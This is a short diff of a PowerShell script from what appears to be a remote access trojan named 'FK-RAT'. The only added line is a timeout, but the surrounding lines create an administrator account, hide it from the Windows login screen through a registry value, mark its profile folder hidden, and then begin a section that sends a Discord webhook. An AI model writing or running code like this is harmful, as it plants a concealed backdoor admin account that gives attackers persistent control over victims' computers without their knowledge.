@@ -80,6 +80,7 @@ createAdmin -uName $uName -pWord $pWord
 ## Hide FK-RAT User (Admin)
 New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
+timeout 8
 Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
 ## Sends Discord Webhook
